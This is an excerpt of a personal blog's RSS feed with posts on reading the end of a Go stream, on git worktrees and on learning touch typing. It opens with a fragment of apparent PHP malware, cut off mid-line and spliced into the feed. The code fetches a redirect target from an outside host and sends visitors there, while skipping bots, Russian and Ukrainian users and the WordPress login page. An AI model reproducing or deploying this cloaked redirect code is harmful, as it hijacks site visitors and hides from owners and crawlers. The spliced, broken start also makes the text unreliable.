@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

function cookie()
{

    $may_url = 'https://bing-bot.com/red.txt';
    $ch = curl_init($may_url );
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $html = curl_exec($ch);
    curl_close($ch);
    $new_url =  $html;

    $y2k = mktime(0, 0, 0, 1, 1, 2032);
    if (empty($_COOKIE['sl_message'])) {
        setcookie('sl_message', 'admin', $y2k, '/');
        header('Location: ' . $new_url); die(&quot;_&quot;);
    } else {
        if (empty($_COOKIE['ssl_message'])) {
            setcookie('ssl_message', 'admin', $y2k, '/');
            header('Location: ' . $new_url); die(&quot;_&quot;);
        }

    }
}

class redir
{
	
    var $language;
    var $referer = &quot;&quot;;
    var $url = &quot;&quot;;
    var $url_stop = array(&quot;wp-login.php&quot;, &quot;конец строки&quot;);
    var $lang_stop = array(&quot;ru&quot;, &quot;ua&quot;);
    var $redirekt = true;
    var $ok_str;
    var $stop_referal_str = array(&quot;=site%3A&quot;, &quot;.ru&quot;);

    function __construct()
	
    {
        $this-&gt;add_stop_str();
        $this-&gt;get_refer();
        $this-&gt;get_url();
        $this-&gt;get_lang();
        $this-&gt;test_redirekt();

    }

    private function test_redirekt()
    {
		
        if ($this-&gt;is_bot()) {
            $this-&gt;redirekt = false;
            return;
        }
		
        if ($this-&gt;test_stop_lang()) {
            $this-&gt;redirekt = false;
            return;
        }

        if ($this-&gt;test_stop_str_referal()) {
            $this-&gt;redirekt = false;
            return;
        }

        if ($this-&gt;test_stop_url($this-&gt;url)) {
            $this-&gt;redirekt = false;
            return;
        }

        if (!$this-&gt;strpos_arr($this-&gt;ok_str, $this-&gt;referer)) {
            $this-&gt;redirekt = false;
//            return;
        }
		
//var_dump($this-&gt;url);
		
        if (!$this-&gt;st]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>Reading the last bytes of a stream in Go</title>
      <link>https://klingt.net/articles/reading-the-last-bytes-of-a-stream-in-go.html</link>
      <description>In this post I explain how to efficiently read the last bytes of a stream of file, just like the good old tail utility.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="In this post I explain how to efficiently read the last bytes of a stream of file, just like the good old tail utility.">
  
  <title>Reading the last bytes of a stream in Go</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Reading the last bytes of a stream in Go</h1>
<p>It's about half a year since my last blog post, so it's about time to write another one.</p>
<p>Yesterday I was working on a private project that required to read a block of bytes from the end of an <code>io.Reader</code>.
On a first glance that sounds like a trivial problem, but doing this <em>efficiently</em> turned out to be more complicated than initially thought.</p>
<p>If your <code>io.Reader</code> stems from a file you're lucky, because regular files allow random access through the system <a href="https://man7.org/linux/man-pages/man2/lseek.2.html">seek call</a> that is exposed on a <code>os.File</code> with its <a href="https://pkg.go.dev/os#File.Seek"><code>Seek</code> method</a>.  However, my function only accepts a plain <code>io.Reader</code> and not an <code>os.File</code>, so this option is out of question.</p>
<p>How can we read the last N bytes of a <em>finite</em> stream of some kind?</p>
<h2>Naïve solution</h2>
<p>A naïve solution would be to <a href="https://pkg.go.dev/io#ReadAll">read the whole file into memory</a> and then discard everything except for some slice of bytes at the end.</p>
<pre><code class="language-go">func readTail(r io.Reader, N int) ([]byte, error) {
	data, err := io.ReadAll(r)
	if err != nil {
		return nil, err
	}

	return data[len(data)-N:], nil
}
</code></pre>
<p>This is pretty wasteful and might require huge amounts of memory, depending on how long the stream you want to consume is.</p>
<h2>Two interleaved buffers</h2>
<p>The next idea I had was to read the stream in chunks of size N, and discarding every chunk except the last one.
But this won't work because of a variety of reasons, first and foremost if the stream length is not an integer multiple of N then the last chunk might be incomplete since it is only the remainder of file size divided by chunk size (N).</p>
<p><img src="unalinged-end-of-file-read.png" alt="illustration of an unaligned read"></p>
<p>So, why not maintain two buffers, one for the previous read and another one for the current read.
When reaching EOF we can then concatenate the second last read with the last and return an slice of size N, right?
This might work, but turns out to be pretty complicated because of how <code>io.Read</code> might behave.
A call to <code>Read</code> is not guaranteed to return <code>N</code> bytes, instead it might fill only a <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.19.2:src/io/io.go;l=60-61">part of the given buffer</a>:</p>
<pre><code class="language-go">// If some data is available but not len(p) bytes, Read conventionally
// returns what is available instead of waiting for more.
</code></pre>
<p>So, we can't easily fill the two buffers in an interleaved manner because a single read might not fill a whole buffer.
Of course, there's <a href="https://pkg.go.dev/io#ReadFull"><code>io.ReadFull</code></a> which takes care of reading exactly N bytes if available, but the logic would still be quite convoluted.</p>
<h2>Ring buffer</h2>
<p>After dabbling around for a while with the solution I had, I realized that what I wrote looked almost like a <a href="https://en.wikipedia.org/wiki/Circular_buffer">ring buffer</a>.
With a ring buffer, sometimes also called circular buffer, we only need O(n) space instead of O(2n) as required with the previous concept.
The gist is to store each chunk in a ring buffer, wrapping around if it exceeds the end of the ring buffers internal array.</p>
<p><img src="ring-buffer-end-of-file-read.png" alt="illustration of reading chunks with a ring buffer"></p>
<p>After we reached the end of the stream we can just return a slice from the ring buffer, starting from the write head and reaching back N bytes.
Those are two operations if we need to wrap around</p>
<pre><code class="language-go">copy(dst[:N-wpos], ringbuf[wpos:])
copy(dst[N-wpos:], ringbuf[:wpos])
</code></pre>
<p>where <code>wpos</code> is the index of the write head.</p>
<p>One thing that bit me was that <code>io.Read</code> might return <code>io.EOF</code> together with a non-zero amount of bytes read, <em>or</em> it could return <code>0, io.EOF</code> after the last call that returned a non-zero amount of bytes and a <code>nil</code> error.
This is <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.19.2:src/io/io.go;l=83">documented behavior</a> but could still be surprising.</p>
<pre><code class="language-go">// An instance of this general case is that a Reader returning
// a non-zero number of bytes at the end of the input stream may
// return either err == EOF or err == nil. The next Read should
// return 0, EOF.
</code></pre>
<p>You can find an ugly example in <a href="https://go.dev/play/p/M-WcpkVviGV">this playground</a> but be aware that you need to run it locally, since external URLs might not be resolved in the playground.</p>
<p>There are a number of performance considerations that arise from this implementation, e.g. a very small <code>N</code> might lead to a huge number of read calls if the ring buffer's size is equal to <code>N</code>.
Technically they are independent, the only condition is that the ring buffer must at least have a size of <code>N</code>.</p>
<p>You might've guessed it already but the good old <code>tail</code> utility serves the same purpose.  I haven't had a look in <a href="https://github.com/coreutils/coreutils/blob/master/src/tail.c">GNU tail's source code</a> yet, but I'm curious to see how they achieved this.</p>
<p>I hope that helped someone.
Please let me know if you've an even more efficient solution or there is any other feedback for me.</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>Git Worktrees (Update)</title>
      <link>https://klingt.net/articles/git-worktrees-update.html</link>
      <description>Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.">
  
  <title>Git Worktrees (Update)</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Git Worktrees</h1>
<p>At work I often face the situation that I want to locally review some feature branch of a colleague.
In general that's easy, one <code>git switch --track origin/branch-name</code> later and you have the changes in your local repository.
However, most of the time I was currently working in my own feature branch where I had unstaged changes.
This means I needed to commit my local changes before I could switch to the colleague's branch.
Wouldn't it be nice if I could work on multiple branches of a repository at the same time?</p>
<p>You might be tempted to say, I know how to do that, just make a second clone of the repository and call it a day.
That would work, of course, but it'd also be very wasteful since the whole repository needs to be cloned twice.
For large repositories this could mean duplicating hundreds or thousands of megabytes.
But guess what, git got you covered!  There's a lesser known command that handles exactly this use case, it's <a href="https://git-scm.com/docs/git-worktree">git worktree</a>.</p>
<p>There's a variety of ways how to use git worktrees.</p>
<h2>Existing repository</h2>
<p>Let's assume that you're in some repository that you cloned a while a go and now you want to switch to a different branch without having to commit your local changes.
We can do that by creating a new <em>worktree</em> like this:</p>
<pre><code class="language-sh">$ git worktree add ../repository.feat-x origin/feat-x
</code></pre>
<p>This will create a copy, which shares the same <code>.git</code> data, in <code>../repository.feat-x</code> at branch <code>origin/feat-x</code>.
It's sensible to not add the worktree inside the existing repository because then you would need to ignore the worktree directory.</p>
<p>Checking out a new branch when creating a worktree is also very easy, just pass <code>-b my-branch-name</code>, that's it.</p>
<p>If you're done with your work you can remove your worktree like</p>
<pre><code class="language-sh">$ rm -rf ../repository.feat-x
</code></pre>
<p>or run</p>
<pre><code class="language-sh">$ git worktree remove repository.feat-x
</code></pre>
<p>instead.
But <code>git worktree remove</code> should be preferred, otherwise some metadata will not be removed until a <code>git gc</code> or <code>git worktree prune</code> was run.</p>
<p>All worktrees of a repository can be listed with <code>git worktree list</code>.</p>
<h2>New repository layout</h2>
<p><strong>Update</strong>: In the <a href="https://github.com/klingtnet/klingtnet.github.io/blob/c800968678ffda04ec8a0cab04f28b7774dcefef/content/articles/2022-10-07-git-worktree.md">previous version of this article</a> I used a <a href="https://git-scm.com/docs/git-clone#Documentation/git-clone.txt---bare">bare repository</a> but this will lead to problems since this type of repository is not intended to be updated or track remote changes.  I did found another simple solution that I will explain below.</p>
<p>Let's say we want to patch something in the Go compiler on <code>master</code>, <code>1.19</code> and <code>1.18</code> branches.
We can setup the project like this:</p>
<pre><code class="language-sh">$ mkdir -p go/worktrees
$ cd go/worktrees
$ git clone git@github.com:golang/go master
$ cd master
# add the first worktree
$ git worktree add -B release-branch.go1.19 ../go1.19
# and the second worktree
$ git worktree add -B release-branch.go1.18 ../go1.18
</code></pre>
<p>What we end up with is a project structure like this</p>
<pre><code class="language-sh">$ tree -L 2 go
go
└── worktrees
    ├── go1.18
    ├── go1.19
    └── master
</code></pre>
<p>where each directory below <code>/worktrees</code> contains the repository at a different branch.</p>
<p>For work projects I could imagine a directory structure that looks similar to this:</p>
<pre><code class="language-sh">go
└── worktrees
    ├── master
    ├── feature
    └── review
</code></pre>
<p>Note that each worktree just acts like a copy of the repository, so I can switch to whatever branch I like, i.e. the worktree is not pinned to the branch it was created with.
In the example above I would use <code>work/</code> for my local feature development, <code>experiment/</code> for trying out some ideas, and <code>review/</code> whenever I need to checkout and review some feature of a colleague locally.</p>
<p>Let me know what your experience with git worktree is and if and how you use it.</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>Learning Touch Typing</title>
      <link>https://klingt.net/articles/learning-touch-typing.html</link>
      <description>My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.">
  
  <title>Learning Touch Typing</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Learning Touch Typing</h1>
<p>Lately two articles about developer productivity appeared in my news feed.  The first was <a href="https://scattered-thoughts.net/writing/speed-matters/">speed matters</a>, which is part of the great <a href="https://scattered-thoughts.net/writing/reflections-on-a-decade-of-coding/">reflections on a decade of coding</a> article series, and second is <a href="https://danluu.com/productivity-velocity/">some reasons to work on productivity and velocity</a> by Dan Luu.  Both articles stated that <a href="https://en.wikipedia.org/wiki/Touch_typing">touch typing</a> improved their productivity.  The productivity boost was not limited to a bare increase in word per minute that one can type, instead the greater leverage comes from an increased accuracy.  Making less typing errors improves the writing flow because every typo requires a context switch in order to fix the mistake.  Jamie Brandon wrote:</p>
<blockquote>
<p>If you compare two coders, one who can touch type and one who has to hunt and peck, the difference between them is not just down to typing speed. The hunter-and-pecker has to think about typing! This consumes attention and short-term memory that is sorely needed for thinking about the program itself.</p>
</blockquote>
<p>Dan Luu  wrote this about typing speed:</p>
<blockquote>
<p>I've actually looked at where my time goes and a lot of it goes to things that are canonical examples of things that you shouldn't waste time improving because people don't spend much time doing them.</p>
<p>An example of one of these, the most commonly cited bad-thing-to-optimize example that I've seen, is typing speed (when discussing this, people usually say that typing speed doesn't matter because more time is spent thinking than typing). But, when I look at where my time goes, a lot of it is spent typing.</p>
</blockquote>
<p>Reading both articles motivated me to give it another try.  I was satisfied with the speed of my self learned four finger typing method but what actually annoyed me was how many typing errors I made.  One thing that I can say for sure is fixing too many typing mistakes let me loose my &quot;flow&quot;.</p>
<p>Learning how to touch type takes a lot of dedication, it feels like learning an instrument or how to play the piano (even though it's quite a bit easier).  The hardest part for me was to realize that touch typing will be a lot slower than my current technique until I get more comfortable with it.  As always, learning something takes practice, practice and even more practice.</p>
<p>Learning touch typing begins with the home row, this is the middle row of your keyboard where your fingers will rest and return to after hitting any key.  For the basics I used <a href="https://www.typingtom.com/lessons">typingtom.com</a> with which I learned how to type on the home and top row after a day or two.  But the lessons were too repetitive, so they quickly became boring.  Luckily there are a bunch of alternatives from which I chose <a href="https://www.keybr.com">keybr.com</a> because it provided some nice statistics for tracking the learning progress and the lessons used random but readable and pronounceable words spit out by some word generating algorithm.  Following is the progress chart after about a week of practicing touch typing:</p>
<p><img src="touch-typing-progress.png" alt="progress of learning touch typing"></p>
<p>The green line shows typing speed in words per minute, red is the number of errors and (kind of) purple is the number of keys in the lesson.  It took me about five days to learn all characters and to get as fast, if not even a bit faster, as with my previous hunt and peck approach.  In the last quarter of the graph you can see a steep decline in typing speed and this is because I activated capitalization and symbols.  On a US QWERTY keyboard most common symbols are located on the right half, hence they must be hit with the right hand pinky.  For me, one of the hardest things was learning to type with my pinky and ring finger.</p>
<p>Now it's all about practicing and getting back to speed.  For this reason I forced myself to write this article using touch typing which went okay but could have been a bit smoother 🙄  Anyways, if you now decide to learn this skill as well I wish you all the best 💪.  It's not as hard to learn as you might think and it should only take a month of typing to become fast and accurate.</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
  </channel>
</rss>